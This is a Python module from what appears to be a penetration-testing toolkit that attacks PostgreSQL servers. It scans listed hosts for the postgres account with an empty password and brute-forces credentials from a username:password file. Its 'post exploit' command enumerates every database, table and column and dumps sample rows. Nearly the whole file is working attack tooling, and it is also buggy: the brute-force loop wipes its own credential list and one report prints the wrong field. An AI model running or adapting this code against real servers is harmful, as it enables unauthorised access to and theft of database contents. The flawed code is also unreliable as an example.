from src.utilities.utilities import get_hosts_from_file, get_default_context_execution, add_default_parser_arguments
import psycopg

class Unpassworded_Vuln_Data():
    def __init__(self, host: str, dbs: list[str]):
        self.host = host
        self.dbs = dbs

def brute_single(host, creds, timeout, errors, verbose):
    creds = []
    ip, port = host.split(":")
    for cred in creds:
        u, p = cred.split(":")

        try:
            db_params = {
                "user": u,
                "password": p,
                "host": ip,
                "port": int(port),
            }
            with psycopg.connect(**db_params) as con:
                with con.cursor() as cur:
                    creds.append(f"{u}:{p}")

        except Exception as e:
            if errors: print(f"Error for {host}: {e}")
    if len(creds) > 0: return f"{host} - {",".join(creds)}"

def brute_nv(hosts, creds, threads, timeout, errors, verbose):
    results: list[str] = get_default_context_execution("PostgreSQL without Password Usage", threads, hosts, (brute_single, creds, timeout, errors, verbose))

        
    if results and len(results) > 0:
        print("Valid PostgreSQL credential found:")
        for r in results:
            print(f"    {r}")

def brute_console(args):
    brute_nv(get_hosts_from_file(args.target), get_hosts_from_file(args.credential), args.threads, args.timeout, args.errors, args.verbose)

def post_nv(hosts, threads, timeout, errors, verbose):
    for host in hosts:
        try:
            ip, port = host.split(":")

            dbs = []
            db_params = {
                "user": "postgres",
                "password": "",
                "host": ip,
                "port": int(port),
            }
            with psycopg.connect(**db_params) as con:
                with con.cursor() as cur:
                    cur.execute("SELECT datname FROM pg_database;")
                    dbs = [record[0] for record in cur]
            for db in dbs:
                try:
                    db_params = {
                        "dbname": db,
                        "user": "postgres",
                        "password": "",
                        "host": ip,
                        "port": int(port),
                    }
                    with psycopg.connect(**db_params) as con:
                        with con.cursor() as cur:
                            cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';")
                            print(f"DATABASE: {db}")
                            print("=======================")
                            tables = [record[0] for record in cur]
                            for table in tables:
                                try:
                                    print(table)
                                    print("-----------------------")
                                    cur.execute(f"SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '{table}';")
                                    columns = []
                                    for c in cur:
                                        print(f"{c[0]}: {c[1]}")
                                        columns.append(c[0])
                                    print()
                                    try:
                                        print("#######################")
                                        cur.execute(f"SELECT {", ".join(columns)} FROM {table} LIMIT 10;")
                                        for v in cur:
                                            print(v)
                                        print()
                                    except Exception as e: pass
                                    print()
                                except Exception as e: pass
                            
                                
                except Exception as e: pass
            
        except Exception as e: pass
        
def post_console(args):
    post_nv(get_hosts_from_file(args.target), args.threads, args.timeout, args.errors, args.verbose)

def unpassworded_single(host, timeout, errors, verbose):
    try:
        ip, port = host.split(":")
        db_params = {
            "user": "postgres",
            "password": "",
            "host": ip,
            "port": int(port),
        }
        with psycopg.connect(**db_params) as con:
            with con.cursor() as cur:
                cur.execute("SELECT datname FROM pg_database;")
                dbs = [record[0] for record in cur]
                return Unpassworded_Vuln_Data(host, dbs)
    except Exception as e:
        if errors: print(f"Error for {host}: {e}")
    

def unpassworded_nv(hosts, threads, timeout, errors, verbose):
    results: list[Unpassworded_Vuln_Data] = get_default_context_execution("PostgreSQL without Password Usage", threads, hosts, (unpassworded_single, timeout, errors, verbose))

    if results and len(results) > 0:
        print("PostgreSQL servers that allows user postgres with empty password authentication:")
        for r in results:
            print(f"{r.host}: {", ".join(r.host)}")
                    
def unpassworded_console(args):
    unpassworded_nv(get_hosts_from_file(args.target), args.threads, args.timeout, args.errors, args.verbose)

def helper_parse(commandparser):
    parser_task1 = commandparser.add_parser("psql")
    subparsers = parser_task1.add_subparsers(dest="command")
    
    parser_default = subparsers.add_parser("default", help="Checks if default/empty password is used")
    add_default_parser_arguments(parser_default)
    parser_default.set_defaults(func=unpassworded_console)
    
    parser_brute = subparsers.add_parser("brute", help="Bruteforce")
    parser_brute.add_argument("target", type=str, help="File name or targets seperated by space")
    parser_brute.add_argument("credential", type=str, help="Credential file, format is username:password")
    add_default_parser_arguments(parser_brute, False)
    parser_brute.set_defaults(func=brute_console)
    
    parser_post = subparsers.add_parser("post", help="Post Exploit")
    parser_post.add_argument("target", type=str, help="File name or targets seperated by space")
    parser_post.add_argument("username", type=str, default="postgres", help="Username (Default = postgres)")
    parser_post.add_argument("password", type=str, default="", help="Username (Default = '')")
    add_default_parser_arguments(parser_post, False)
    parser_post.set_defaults(func=post_console)